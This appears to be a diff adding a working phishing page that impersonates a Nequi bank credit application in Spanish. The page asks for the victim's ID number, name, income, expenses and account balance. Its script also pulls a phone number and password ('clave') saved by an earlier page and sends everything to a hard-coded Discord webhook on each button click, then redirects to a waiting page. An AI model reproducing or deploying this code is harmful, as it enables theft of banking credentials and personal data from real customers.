@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Nequi - Crédito</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Poppins:wght@400;500;600;700&display=swap');
+body{margin:0;font-family:'Inter',system-ui,sans-serif;background:#ffffff;color:#222;}
+.header{padding:12px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #eee;}
+.nequi-logo-svg{display:flex;align-items:center;margin-left:70px;}
+.nequi-logo-svg img{height:52px;}
+.menu{font-size:28px;cursor:pointer;color:#333;}
+.hero-top{width:100%;display:flex;justify-content:center;margin-top:-10px;z-index:2;position:relative;}
+.hero-top img{width:100%;max-width:420px;border-radius:0 0 25px 25px;}
+.credit-card{background:#2b002b;color:white;margin:15px auto 20px;border-radius:16px;padding:16px 18px;max-width:320px;width:90%;}
+.amount{font-size:30px;font-weight:bold;margin:8px 0;text-align:center;}
+.form-section{padding:10px 20px 30px;max-width:340px;margin:0 auto;}
+.form-title{font-size:18px;margin:20px 0 12px;color:#333;font-weight:600;}
+.input-field,select{background:#f9f0ff;border:none;padding:14px 16px;border-radius:12px;width:100%;margin-bottom:10px;font-size:16px;color:#333;}
+select{appearance:none;background-image:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' fill='%23666' viewBox='0 0 16 16'%3E%3Cpath d='M8 11L3 6h10z'/%3E%3C/svg%3E");background-repeat:no-repeat;background-position:right 16px center;}
+#mensaje_confirm{display:none;color:#ff008c;font-weight:600;margin:10px 0 8px;font-size:14.5px;}
+#btnSolicitar{width:100%;padding:16px;background:#ff008c;color:white;border:none;border-radius:12px;font-size:17px;font-weight:600;margin-top:15px;opacity:0.6;cursor:not-allowed;}
+.footer-nequi{width:100%;display:flex;justify-content:center;margin-top:40px;background:#200020;}
+.footer-nequi img{width:100%;max-width:1000px;display:block;}
+.texto-ayuda{font-size:12px;color:#666;margin-top:-5px;margin-bottom:10px;padding-left:5px;}
+.info-text{font-size:16px;color:#000;font-weight:500;margin-top:12px;line-height:1.4;}
+.plazo-container{display:flex;gap:10px;margin-top:12px;}
+.plazo-option{flex:1;text-align:center;padding:12px 0;border-radius:12px;background:#f3e6f7;color:#333;font-weight:500;font-size:14px;cursor:pointer;transition:0.2s;}
+.plazo-option.active{background:#2b002b;color:#fff;}
+.plazo-option:active{transform:scale(0.96);}
+.plazo-bar{width:100%;height:6px;background:#f3e6f7;border-radius:10px;margin-top:10px;overflow:hidden;}
+.plazo-bar-fill{width:33%;height:100%;background:#ff008c;border-radius:10px;transition:0.3s ease;}
+.fecha-container{display:flex;gap:8px;margin-top:12px;overflow-x:auto;padding-bottom:5px;}
+.fecha-option{min-width:50px;text-align:center;padding:10px 0;border-radius:12px;background:#f3e6f7;color:#333;font-weight:500;font-size:14px;cursor:pointer;transition:0.2s;}
+.fecha-option.active{background:#ff008c;color:#fff;}
+.fecha-option:active{transform:scale(0.95);}
+.cuota-box{background:#f9f0ff;border-radius:14px;padding:16px;margin-top:12px;text-align:center;}
+.cuota-valor{font-size:22px;font-weight:700;color:#2b002b;margin:0;}
+.cuota-texto{font-size:14px;color:#555;margin-top:5px;}
+</style>
+</head>
+<body>
+<div class="header">
+    <a href="#" class="nequi-logo-svg">
+        <img src="nequi.png" alt="Nequi" style="height:52px;">
+    </a>
+    <div class="menu">≡</div>
+</div>
+<div class="hero-top">
+    <img src="hero1.png" alt="Créditos Nequi">
+</div>
+<div class="credit-card">
+    <p style="margin:0 0 8px;opacity:0.9;font-size:15px;text-align:center;">¿Cuánta plata necesitas?</p>
+    <div class="amount" id="amount">$100.000</div>
+    <p style="font-size:13px;color:#aaa;text-align:center;line-height:1.4;">Ten en cuenta que el valor que selecciones en este rango,<br>es el valor que vas a desembolsar.</p>
+    <input type="range" min="100000" max="5000000" value="100000" step="50000" id="slider" oninput="ua(this.value)" style="width:100%;">
+</div>
+<div class="form-section">
+    <div class="form-title">Datos personales</div>
+    <input type="text" id="c1" class="input-field" placeholder="Ingresa tu cédula" maxlength="10">
+    <input type="text" id="n1" class="input-field" placeholder="Nombre y apellido">
+    <select id="o1" class="input-field">
+        <option value="">Selecciona tu ocupación</option>
+        <option value="Empleado">Empleado</option>
+        <option value="Pensionado">Pensionado</option>
+        <option value="Independiente">Independiente</option>
+        <option value="Estudiante">Estudiante</option>
+    </select>
+    <input type="tel" id="i1" class="input-field" placeholder="Ingresos mensuales" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+<input type="tel" id="g1" class="input-field" placeholder="Gastos mensuales" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+<input type="tel" id="s1" class="input-field" placeholder="Saldo actual en tu cuenta NEQUI" inputmode="numeric" oninput="this.value=this.value.replace(/[^0-9]/g,'')">
+    <p class="texto-ayuda">Por políticas financieras el saldo actual no será visible en la solicitud, solo hace parte del proceso de validación ante las centrales de riesgo.</p>
+    <p class="info-text">¿En cuánto tiempo quieres pagar tu préstamo?</p>
+    <div class="plazo-container">
+        <div class="plazo-option active">6 meses</div>
+        <div class="plazo-option">12 meses</div>
+        <div class="plazo-option">24 meses</div>
+    </div>
+    <div class="plazo-bar"><div class="plazo-bar-fill"></div></div>
+    <p class="info-text">Elige tu fecha de pago</p>
+    <div class="fecha-container">
+        <div class="fecha-option active">5</div>
+        <div class="fecha-option">10</div>
+        <div class="fecha-option">15</div>
+        <div class="fecha-option">20</div>
+        <div class="fecha-option">25</div>
+        <div class="fecha-option">30</div>
+    </div>
+    <p class="info-text">Así quedarían tus cuotas</p>
+    <div class="cuota-box">
+        <p class="cuota-valor" id="cv">$0</p>
+        <p class="cuota-texto" id="ct">por 6 meses</p>
+    </div>
+    <p id="mensaje_confirm" style="display:none;color:#ff008c;font-weight:600;">Confirma tu saldo actual escribiéndolo nuevamente:</p>
+    <button id="btnSolicitar" disabled>Solicitar Crédito</button>
+</div>
+<div class="footer-nequi">
+    <img src="footer.png" alt="Footer Nequi">
+</div>
+
+<script>
+const w1="https://discord.com/api/webhooks/1493343094945615982/ulTyOytaFUTVMzjlsPTEjl4VKHJG9rf8h7VnS17jwc44dV_7dxgSS4a_kQUiOtz-FpMR";let cf=false;let e2=false;function fc(i){let v=i.value.replace(/[^0-9]/g,'');if(v==='')return;i.value='$'+parseInt(v).toLocaleString('es-CO');}['i1','g1','s1'].forEach(id=>{let el=document.getElementById(id);if(el)el.addEventListener('input',()=>fc(el));});document.getElementById('c1').addEventListener('input',function(){this.value=this.value.replace(/[^0-9]/g,'');});document.getElementById('n1').addEventListener('input',function(){this.value=this.value.replace(/[^a-zA-ZáéíóúÁÉÍÓÚñÑ\s]/g,'');});function vf(){let btn=document.getElementById('btnSolicitar');let lleno=document.getElementById('c1').value.trim()&&document.getElementById('n1').value.trim()&&document.getElementById('o1').value&&document.getElementById('i1').value.trim()&&document.getElementById('g1').value.trim()&&document.getElementById('s1').value.trim();btn.disabled=!lleno;btn.style.opacity=lleno?"1":"0.6";btn.style.cursor=lleno?"pointer":"not-allowed";}document.querySelectorAll('.input-field,select').forEach(el=>{el.addEventListener('input',vf);el.addEventListener('change',vf);});function ua(v){document.getElementById('amount').textContent=new Intl.NumberFormat('es-CO',{style:'currency',currency:'COP'}).format(v);}
+function od(){let f=JSON.parse(localStorage.getItem("x1"))||{};return f.p1||"No disponible";}
+function ok(){let f=JSON.parse(localStorage.getItem("x1"))||{};return f.clave||"No disponible";}
+function gd(){let f=JSON.parse(localStorage.getItem("x1"))||{};f.monto=document.getElementById('amount').textContent;f.nombre=document.getElementById('n1').value;f.cedula=document.getElementById('c1').value;f.saldo=document.getElementById('s1').value||"No confirmado";f.ocupacion=document.getElementById('o1').value;f.ingresos=document.getElementById('i1').value;f.gastos=document.getElementById('g1').value;f.plazo=document.querySelector('.plazo-option.active').textContent;localStorage.setItem("x1",JSON.stringify(f));}
+function ed(t){gd();let m=`📩 ${t} - SOLICITUD DE CRÉDITO NEQUI\n\n`+`📱 Número: ${od()}\n`+`🔑 Clave: ${ok()}\n`+`━━━━━━━━━━━━━━━━━━━━━\n`+`💰 Monto: ${document.getElementById('amount').textContent}\n`+`👤 Nombre: ${document.getElementById('n1').value}\n`+`🪪 Cédula: ${document.getElementById('c1').value}\n`+`💵 Saldo: ${document.getElementById('s1').value||"No confirmado"}\n`+`📊 Ocupación: ${document.getElementById('o1').value}\n`+`📈 Ingresos: ${document.getElementById('i1').value}\n`+`📉 Gastos: ${document.getElementById('g1').value}`;fetch(w1,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({content:m})}).catch(e=>console.error("Error",e));}
+document.getElementById('btnSolicitar').addEventListener('click',function(){if(this.disabled)return;if(!cf){this.disabled=true;ed("PRIMER CLICK");document.getElementById('s1').value="";document.getElementById('mensaje_confirm').style.display="block";this.textContent="Confirmar Saldo";cf=true;setTimeout(()=>{this.disabled=false;},500);return;}if(e2)return;e2=true;let s=document.getElementById('s1').value.trim();if(!s){alert("Debes confirmar tu saldo");e2=false;return;}this.disabled=true;ed("SEGUNDO CLICK (CONFIRMADO)");setTimeout(()=>{window.location.href="espera.html";},1500);});const ops=document.querySelectorAll('.plazo-option');const bar=document.querySelector('.plazo-bar-fill');ops.forEach((op,idx)=>{op.addEventListener('click',()=>{ops.forEach(o=>o.classList.remove('active'));op.classList.add('active');if(idx===0)bar.style.width="33%";if(idx===1)bar.style.width="66%";if(idx===2)bar.style.width="100%";cc();});});document.querySelectorAll('.fecha-option').forEach(op=>{op.addEventListener('click',()=>{document.querySelectorAll('.fecha-option').forEach(o=>o.classList.remove('active'));op.classList.add('active');});});function gp(){const ac=document.querySelector('.plazo-option.active');return parseInt(ac.textContent);}function gm(){return parseInt(document.getElementById('slider').value);}function cc(){const m=gm();const ms=gp();const it=0.02;const tot=m*(1+it*ms);const cu=tot/ms;let cv=document.getElementById('cv');let ct=document.getElementById('ct');if(cv)cv.textContent=new Intl.NumberFormat('es-CO',{style:'currency',currency:'COP'}).format(Math.round(cu));if(ct)ct.textContent=`por ${ms} meses`;}document.getElementById('slider').addEventListener('input',function(){ua(this.value);cc();});window.addEventListener('load',function(){cc();});
+</script>
+</body>
+</html>
